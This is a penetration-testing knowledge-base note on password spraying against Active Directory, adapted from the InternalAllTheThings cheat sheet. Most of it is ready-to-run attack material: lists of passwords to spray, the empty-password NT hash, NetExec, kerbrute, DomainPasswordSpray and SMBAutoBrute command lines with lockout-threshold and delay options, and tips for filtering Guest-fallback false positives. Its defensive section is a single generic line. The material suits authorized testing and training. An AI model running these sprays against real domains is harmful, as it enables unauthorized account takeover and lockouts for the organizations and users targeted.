---
title: Password - Spraying
type: technique
tags: [active-directory, brute-force, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Password - Spraying

## What it is

Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.

## How it works

Password spraying attempts a single (or small set of) common passwords against a large list of user accounts, staying below account lockout thresholds by spacing authentication attempts over time. It exploits the statistical likelihood that at least one user in a large organization uses a weak or seasonal password, while avoiding the lockout triggered by repeated failures against a single account. Attackers enumerate valid usernames via Kerberos pre-authentication (AS-REQ enumeration), LDAP, or OSINT, then spray with timing delays calibrated to the organization's lockout observation window.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.

> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.

Most of the time the best passwords to spray are :

- Passwords: `P@ssw0rd01`, `Password123`, `Password1`,
- Common password: `Welcome1`/`Welcome01`, `Hello123`, `mimikatz`
- $Companyname1:`$Microsoft1`
- SeasonYear: `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
- Default AD password with simple mutations such as number-1, special character iteration (`*`,`?`,`!`,`#`)
- Empty Password: NT hash is `31d6cfe0d16ae931b73c59d7e0c089c0`

:warning: be careful with the account lockout !

## Spray a pre-generated passwords list

- Using [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

```powershell
nxc smb 10.0.0.1 -u /path/to/users.txt -p Password123
nxc smb 10.0.0.1 -u Administrator -p /path/to/passwords.txt

nxc smb targets.txt -u Administrator -p Password123 -d domain.local
nxc ldap targets.txt -u Administrator -p Password123 -d domain.local
nxc rdp targets.txt -u Administrator -p Password123 -d domain.local
nxc winrm targets.txt -u Administrator -p Password123 -d domain.local
nxc mssql targets.txt -u Administrator -p Password123 -d domain.local
nxc wmi targets.txt -u Administrator -p Password123 -d domain.local

nxc ssh targets.txt -u Administrator -p Password123
nxc vnc targets.txt -u Administrator -p Password123
nxc ftp targets.txt -u Administrator -p Password123
nxc nfs targets.txt -u Administrator -p Password123
```

- Using [hashcat/maskprocessor](https://github.com/hashcat/maskprocessor) to generate passwords following a specific rule

```powershell
nxc smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
```

- Using [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray a password against all users of a domain.

```powershell
Invoke-DomainPasswordSpray -Password Summer2021!
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

- Using [shellntel-acct/scripts/SMBAutoBrute](https://github.com/shellntel-acct/scripts/blob/master/Invoke-SMBAutoBrute.ps1).

```powershell
Invoke-SMBAutoBrute -PasswordList "jennifer, yankees" -LockoutThreshold 3
Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
```

## BadPwdCount attribute

> The number of times the user tried to log on to the account using an incorrect password. A value of `0` indicates that the value is unknown.

```powershell
$ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```

## Kerberos pre-auth bruteforcing

Using [ropnop/kerbrute](https://github.com/ropnop/kerbrute), a tool to perform Kerberos pre-auth bruteforcing.

> Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.

- Username bruteforce

```powershell
./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
```

- Password bruteforce

```powershell
./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
```

- Password spray

```powershell
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[hashcat]]
- [[mimikatz]]
- [[netexec]]
- Also uses (no dedicated page yet): Kerbrute

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).

## SMB spray false positives when the Guest account is enabled

When a target has the Guest account enabled (netexec shows `Null Auth: True`), a netexec/CME **SMB**
spray reports success for credentials that are not actually valid: a non-existent username falls back
to a Guest logon, so the line shows `[+] domain\<user>:<pass> (Guest)`. A real account with a wrong
password instead returns `STATUS_LOGON_FAILURE`. So the `(Guest)` tag = false positive, not a hit.

- Always filter it out: `nxc smb <dc> -u users.txt -p '<pass>' --continue-on-success | grep '\[+\]' | grep -v '(Guest)'`.
- Watch for junk usernames in your list (RID-brute parsing artifacts like `A`, `AD`, `G`, `<digits>SA`);
  they are non-existent so they light up as `(Guest)` for every password and pollute the output. Clean
  the list to real accounts first (e.g. `grep -E '^[A-Z]+_[A-Z]'` for a `FIRST_LAST` scheme).
- A real hit is a `[+]` line with **no** `(Guest)` suffix (or `(Pwn3d!)` if local admin).
- To sidestep guest fallback entirely, spray over **Kerberos pre-auth** (kerbrute / `nxc ... -k`) instead
  of SMB: the KDC validates the actual password and there is no guest fallback.

Tooling gotcha for the same enabled-Guest setup: authenticating impacket as the empty-password guest
over a TTY-less bridge makes it prompt via `getpass` and die with `EOFError`. Pass the empty-password
NT hash instead: `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0`.

<!-- promoted-slug: smb-spray-guest-fallback-fp -->
